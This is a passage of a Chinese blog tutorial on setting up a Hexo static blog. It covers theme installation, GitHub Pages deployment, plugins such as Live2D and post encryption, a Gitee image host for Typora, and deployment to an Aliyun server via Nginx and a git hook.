67.1<br>tz: 2020a<br>unicode: 13.0<br></code></pre></td></tr></table></figure><h1 id="Hexo主题设置"><a href="#Hexo主题设置" class="headerlink" title="Hexo主题设置"></a>Hexo主题设置</h1><p>官方主题推荐：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><h2 id="主题1：stun"><a href="#主题1：stun" class="headerlink" title="主题1：stun"></a>主题1：stun</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://theme-stun.github.io/docs/zh-CN/guide/quick-start.html#%E4%BD%BF%E7%94%A8">帮助文档</a><br>在Hexo 根目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean  <br><span class="hljs-comment">#该命令的作用是清除缓存，若不输入此命令，服务器有可能更新不了主题</span><br>$ git <span class="hljs-built_in">clone</span> https://github.com/liuyib/hexo-theme-stun.git themes/stun<br><br><span class="hljs-comment">#安装依赖hexo-renderer-pug</span><br>$ npm install --save hexo-renderer-pug<br></code></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>修改Hexo目录下的<code>_config.yml</code>配置文件中的theme属性，将默认的<code>landscape改</code>为为<code>black-blue</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: stun<br></code></pre></td></tr></table></figure><p>然后，启动 Hexo 服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo s<br></code></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> themes/stun<br>$ git pull<br></code></pre></td></tr></table></figure><h3 id="本地效果"><a href="#本地效果" class="headerlink" title="本地效果"></a>本地效果</h3><p>访问：<a href="http://localhost:4000/">http://localhost:4000/</a><br><img src="https://img-blog.csdnimg.cn/20210131211931994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="主题优化"><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h3><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ npm install --save hexo-render-pug<br>$ npm install --save hexo-generator-search<br>$ npm install --save hexo-deployer-git  <br></code></pre></td></tr></table></figure><p>1.增加页面导航</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">$ hexo <span class="hljs-keyword">new</span> page categories<br>$ hexo <span class="hljs-keyword">new</span> page tags<br></code></pre></td></tr></table></figure><p>在项目目录<code>/source/categories/index.md</code> 加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span>: categories<br></code></pre></td></tr></table></figure><p>在项目目录<code>/source/tags/index.md</code> 加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">type</span>: tags<br></code></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#展示设置</span><br>title: &#123;$自定义文字&#125;<br>language: zh-CN <br>url: &#123;$博客地址&#125;<br><br><span class="hljs-comment">#主题</span><br>theme: stun<br><br><span class="hljs-comment">#git相关</span><br>deploy:<br>  type: git<br>  repo: <br>  github: &#123;$你的博客仓库&#125;<br>  gitee: &#123;$你的博客仓库&#125;<br>  branch: master<br><br><span class="hljs-comment">#搜索相关</span><br>search:<br>  path: search.json<br>  field: post<br>  content: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>2.修改部署文件夹下/themes/stun/_config.yml(挑选重要部分修改)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#取消导航栏注释（注意空格对齐）</span><br>menu:<br>  categories: /categories/ || fas fa-layer-group<br>  tags: /tags/ || fas fa-tags<br>  <br><span class="hljs-comment">#更改图标(最好使用链接地址，我这里使用的图床，图床使用见下一篇博客)</span><br>favicon:<br>  small: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png<br>  medium: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png<br><br><span class="hljs-comment">#更改背景大图</span><br>header:<br>  bg_image:<br>    <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>    url: https://gitee.com/BothSavage/PicGo/raw/master/image/背景.png<br><br><span class="hljs-comment">#更改头像大图，并设为圆形</span><br>author:<br>  avatar:<br>    url: https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png<br>    rounded: <span class="hljs-literal">true</span><br>    <br><span class="hljs-comment">#打开访问统计</span><br>busuanzi:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  <br><span class="hljs-comment">#打开搜索功能</span><br>local_search:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h2 id="主题2：black-blue"><a href="#主题2：black-blue" class="headerlink" title="主题2：black-blue"></a>主题2：black-blue</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ git <span class="hljs-built_in">clone</span> https://github.com/maochunguang/black-blue.git themes/stun<br><br><span class="hljs-comment">#安装依赖</span><br>npm install --save hexo-renderer-jade hexo-renderer-stylus<br>npm install --save hexo-generator-feed hexo-generator-sitemap hexo-generator-archive hexo-browsersync<br></code></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: black-blue<br></code></pre></td></tr></table></figure><p>保存然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo g <span class="hljs-comment"># 生成</span><br>$ hexo s <span class="hljs-comment"># 启动本地web服务器</span><br></code></pre></td></tr></table></figure><h3 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> themes/black-blue<br>$ git pull<br></code></pre></td></tr></table></figure><h2 id="主题3：spfk"><a href="#主题3：spfk" class="headerlink" title="主题3：spfk"></a>主题3：spfk</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ git <span class="hljs-built_in">clone</span> https://github.com/luuman/hexo-theme-spfk.git themes/stun<br></code></pre></td></tr></table></figure><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">101| theme: black-blue<br></code></pre></td></tr></table></figure><p>保存然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean <br>$ hexo g <span class="hljs-comment"># 生成</span><br>$ hexo s <span class="hljs-comment"># 启动本地web服务器</span><br></code></pre></td></tr></table></figure><h3 id="主题优化-1"><a href="#主题优化-1" class="headerlink" title="主题优化"></a>主题优化</h3><p><strong>1.博客个人信息</strong><br>修改Hexo文件夹根目录下的 <code>_config.yml</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#站点标题</span><br><span class="hljs-number">6</span>| title: Atkx<span class="hljs-string">&#x27; blog</span><br><span class="hljs-string">#作者</span><br><span class="hljs-string">10| author: Atkx</span><br></code></pre></td></tr></table></figure><p><strong>2.头像设置</strong><br>这里修改主题文件夹下的<code>_config.yml</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># Link to your avatar |填写头像地址</span><br><span class="hljs-number">16</span>| avatar: img/atkx_32x32.png<br><span class="hljs-comment"># Small icon of Your site | 站点小图标地址</span><br><span class="hljs-number">19</span>| favicon: img/atkx_16x16.png<br></code></pre></td></tr></table></figure><h1 id="Hexo部署到github"><a href="#Hexo部署到github" class="headerlink" title="Hexo部署到github"></a>Hexo部署到github</h1><h2 id="配置github-ssh"><a href="#配置github-ssh" class="headerlink" title="配置github ssh"></a>配置github ssh</h2><blockquote><p>只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步。</p></blockquote><p>在你第一次新建的文件夹里面，点击 Git Bash Here 输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh-keygen -t rsa -C <span class="hljs-string">&quot;你的邮箱&quot;</span><br></code></pre></td></tr></table></figure><p>生成一对密钥 SSH key，持续enter。</p><p>在路径<code>C:\Users\admin\.ssh</code>下找到<code>id_rsa.pub</code>，用记事本打开，复制里面的内容。</p><p>配置路径：github 网站–&gt;Settings–&gt;SSH and GPG keys–&gt;NEW SSH KEY ,title随便填写，把上面复制的内容粘贴进Key里面，点击Add SSH key。</p><p><img src="https://img-blog.csdnimg.cn/20210131144015618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入命令检验是否成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ssh -T git@github.com<br>Hi swhat! You<span class="hljs-string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></code></pre></td></tr></table></figure><h2 id="部署文件"><a href="#部署文件" class="headerlink" title="部署文件"></a>部署文件</h2><p>用sublime打开blog下创建的用户名文件进行部署（将文件直接拖进去就可以了）打开仓库<code>_config.yml</code> 配置文件，</p><p>第16行,更改url</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://swhat.github.io<br></code></pre></td></tr></table></figure><p>拉到文件末尾，填上如下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br>deploy:<br>  <span class="hljs-built_in">type</span>: git<br>  repo: https://github.com/swhat/swhat.github.io.git <br>  <span class="hljs-comment">#仓库名字改成自己的</span><br>  branch: master<br></code></pre></td></tr></table></figure><p><em>若端口冲突，也可以在<code>_config.yml</code>中添加</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">server:<br>  port: 4001 <span class="hljs-comment">#端口号随意，默认是4000</span><br>  compress: <span class="hljs-literal">true</span><br>  header: <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>进入目录，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo g -d<br></code></pre></td></tr></table></figure><p>会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ERROR Deployer not found: git<br></code></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-deployer-git<br></code></pre></td></tr></table></figure><p>重新执行<code>hexo g -d</code>，在弹出的框子中，输入github用户名和密码<br><img src="https://img-blog.csdnimg.cn/20210131153540546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>命令行也输入github用户名和密码<br><img src="https://img-blog.csdnimg.cn/20210131210759817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="网站效果"><a href="#网站效果" class="headerlink" title="网站效果"></a>网站效果</h2><p>访问：<a href="https://swhat.github.io/">https://swhat.github.io</a><br><img src="https://img-blog.csdnimg.cn/20210131210907129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h2><p>方法一：新建一个空文章，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo n <span class="hljs-string">&quot;文章标题&quot;</span><br></code></pre></td></tr></table></figure><p>如：执行<code>hexo new &quot;My New Post&quot;</code>，会在项目 <code>\Hexo\source\_posts</code> 中生成 My New Post.md 文件，可以进行编辑。</p><p>方法二：也可以在项目 <code>\Hexo\source\_posts</code>下，新建md 文件，然后添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: 文章标题<br>date: 时间，如2020-02-02 02:02:02<br>categories: 类别<br>tags:  标签<br></code></pre></td></tr></table></figure><p>在md文章中添加下面的句子，该句子以上可以显示你想显示的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!-- more --&gt;<br></code></pre></td></tr></table></figure><p>当我们用编辑器写好文章后，可以使用以下命令将其推送到服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo clean<br>$ hexo g -d<br></code></pre></td></tr></table></figure><h1 id="博客优化"><a href="#博客优化" class="headerlink" title="博客优化"></a>博客优化</h1><h2 id="添加看板娘"><a href="#添加看板娘" class="headerlink" title="添加看板娘"></a>添加看板娘</h2><p>1、安装模块<br> 在hexo根目录执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-helper-live2d<br></code></pre></td></tr></table></figure><p>可以在<code>package.json</code>查看是否安装成功<br><img src="https://img-blog.csdnimg.cn/20210203145531821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时再去 node_moduels目录下，可以看到有如下文件夹，这些都是动画主配置<br><img src="https://img-blog.csdnimg.cn/2021020314565224.png" alt="在这里插入图片描述"></p><p>2、下载模型<br>地址：<a href="https://github.com/xiazeyu/live2d-widget-models.git">https://github.com/xiazeyu/live2d-widget-models.git</a></p><p>下载好之后将<code>packages</code>里的所有动画模板拷贝到博客的<code>node_modules</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">live2d-widget-model-chitose<br>live2d-widget-model-epsilon2_1<br>live2d-widget-model-gf<br>live2d-widget-model-haru<br>live2d-widget-model-haruto<br>live2d-widget-model-hibiki<br>live2d-widget-model-hijiki<br>live2d-widget-model-izumi<br>live2d-widget-model-koharu<br>live2d-widget-model-miku<br>live2d-widget-model-ni-j<br>live2d-widget-model-nico<br>live2d-widget-model-nietzsche<br>live2d-widget-model-nipsilon<br>live2d-widget-model-nito<br>live2d-widget-model-shizuku<br>live2d-widget-model-tororo<br>live2d-widget-model-tsumiki<br>live2d-widget-model-unitychan<br>live2d-widget-model-wanko<br>live2d-widget-model-z16<br></code></pre></td></tr></table></figure><p>也可以挑选自己喜欢的模型，使用命令安装模型，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install live2d-widget-model-haruto<br></code></pre></td></tr></table></figure><p>4.详细配置<br>在Hexo的 _config.yml 文件或主题的 _config.yml 文件中添加配置.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">live2d:<br>  <span class="hljs-built_in">enable</span>: <span class="hljs-literal">true</span><br>  pluginModelPath: assets/<br>  model:<br>    use: live2d-widget-model-haruto  <br>    <span class="hljs-comment">#模板目录，在node_modules里，这里是模型名称</span><br>  display:<br>    position: right<br>    width: 150 <br>    height: 300<br>  mobile:<br>    show: <span class="hljs-literal">false</span>  <span class="hljs-comment">#是否在手机进行显示</span><br></code></pre></td></tr></table></figure><h2 id="博客加密"><a href="#博客加密" class="headerlink" title="博客加密"></a>博客加密</h2><p>1.安装encrypt插件<br>在博客目录下执行下面的指令安装encrypt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install --save hexo-blog-encrypt<br></code></pre></td></tr></table></figure><p>安装完成后，在package.json文件的dependecies依赖中看到encrypt插件<br><img src="https://img-blog.csdnimg.cn/20210205121402142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 . 加密文章设置<br>将”password”字段添加到文章信息头部：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: 文章标题<br>date: 时间，如2020-02-02 02:02:02<br>categories: 类别<br>tags:  标签<br>password: 123456<br>abstract: 这里有东西被加密了，需要输入密码查看哦。<br>message: 您好，这里需要密码。<br>wrong_pass_message: 抱歉，这个密码看着不太对，请再试试。<br>wrong_hash_message: 抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。<br></code></pre></td></tr></table></figure><p>效果图<br><img src="https://img-blog.csdnimg.cn/202102051217264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="Typora-Gitee搭建图床"><a href="#Typora-Gitee搭建图床" class="headerlink" title="Typora + Gitee搭建图床"></a>Typora + Gitee搭建图床</h1><p>把图片拖进 md 编辑器，图片会自动上传到图床，上传成功图片顶部会出现绿色背景的白字进行提醒。该插件支持、GitHub、七牛云、阿里云、码云等。</p><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Typora 版本：0.9.68 (Windows x86)<br>下载地址：https://typora.io/windows/typora-update-ia32-0320.exe<br>Typora安装目录：D:\Program Files\Typora ，或者安装在其他目录<br></code></pre></td></tr></table></figure><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>覆盖安装的方式在某些特定版本下会触发bug，建议按照这个 issue 中的方法修改 window.html 文件而不是直接覆盖它，plugins 是新增目录不存在覆盖的问题。</p><ol><li>下载插件代码</li><li>复制插件相关代码文件：window.html、plugins；</li><li>将复制的插件代码文件，粘贴到typora安装目录下的 resources\app 文件夹下；</li><li>安装完成，重启typora</li></ol><h2 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h2><p>插件默认会将图片上传到个人站点上（街边价），不能保证一直给大家提供服务，所以按照好插件后，强烈建议你换成自己的图片上传服务器。</p><p>更换图片上传接口地址，打开 plugins/image/upload.js 文件，拉到最下面 将最后一行的 $.image.init(); 按照下面的说明进行配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">上传到码云<br><br>// ！！！注意当图片大于1M时， gitee 必须登录后才能查看！！！<br>$.image.init(&#123;<br>    target:<span class="hljs-string">&#x27;gitee&#x27;</span>,<br>    gitee: &#123;<br>            message: <span class="hljs-string">&quot;From:https://github.com/Thobian&quot;</span>,     // 必须参数,提交消息（默认为：add image）<br>            branch: <span class="hljs-string">&quot;master&quot;</span>,                               // 要提交到的分支（默认为：master）<br>            token: <span class="hljs-string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>,   // 码云token申请地址 https://gitee.com/profile/personal_access_tokens<br>            userName: <span class="hljs-string">&#x27;userName&#x27;</span>,                           // 用户名 比如你的gitee个人主页地址是：https://gitee.com/thobian ，那userName就是：thobian<br>            repositorie: <span class="hljs-string">&#x27;repositorie&#x27;</span>,                     // 仓库名 比如你的gitee图片仓库地址是：https://gitee.com/thobian/typora，那么repositorie就是 typora<br>            Folder: <span class="hljs-string">&#x27;image&#x27;</span>,                                // 可以把上传的图片都放到这个指定的文件夹下<br>            BucketDomain: <span class="hljs-string">&#x27;https://gitee.com/api/v5/repos/&#x27;</span>,// 这个是不用变的，直接copy就好<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><h1 id="部署到阿里云服务器"><a href="#部署到阿里云服务器" class="headerlink" title="部署到阿里云服务器"></a>部署到阿里云服务器</h1><h2 id="创建私有-Git-仓库"><a href="#创建私有-Git-仓库" class="headerlink" title="创建私有 Git 仓库"></a>创建私有 Git 仓库</h2><p>安装Git，Git 用于版本管理和部署</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install git-core <br></code></pre></td></tr></table></figure><p>在 /var/repo/ 下，创建一个名为 hexo_static 的裸仓库,然后需要修改用户对目录的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkdir /var/repo/<br>sudo chown -R <span class="hljs-variable">$USER</span>:<span class="hljs-variable">$USER</span> /var/repo/<br>sudo chmod -R 755 /var/repo/<br></code></pre></td></tr></table></figure><p>然后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/repo/<br>git init --bare hexo_static.git<br></code></pre></td></tr></table></figure><h2 id="配置Nginx托管文件目录"><a href="#配置Nginx托管文件目录" class="headerlink" title="配置Nginx托管文件目录"></a>配置Nginx托管文件目录</h2><p>安装Nginx ，用于静态博客托管。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install nginx<br></code></pre></td></tr></table></figure><p>创建 /var/www/hexo 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mkdir -p /var/www/hexo<br></code></pre></td></tr></table></figure><p>修改目录的所有权和权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo chown -R <span class="hljs-variable">$USER</span>:<span class="hljs-variable">$USER</span> /var/www/hexo<br>sudo chmod -R 755 /var/www/hexo<br></code></pre></td></tr></table></figure><p>修改 Nginx 的 default 设置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo vim /etc/nginx/sites-available/default<br></code></pre></td></tr></table></figure><p>将root 指向 <code>/var/www/hexo</code> 目录，修改内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">server &#123;<br>    listen 80 default_server;<br>    listen [::]:80 default_server;<br><br>    root /var/www/hexo; <span class="hljs-comment"># 需要修改的部分</span><br>    index index.html index.htm;<br></code></pre></td></tr></table></figure><p>然后重启 Nginx 服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo service nginx restart<br></code></pre></td></tr></table></figure><h2 id="配置git-hooks"><a href="#配置git-hooks" class="headerlink" title="配置git hooks"></a>配置git hooks</h2><p>在hooks文件中创建post-receive文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /var/repo/hexo_static.git/hooks/post-receive<br></code></pre></td></tr></table></figure><p>添加内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>git --work-tree=/var/www/hexo --git-dir=/var/repo/hexo_static.git checkout 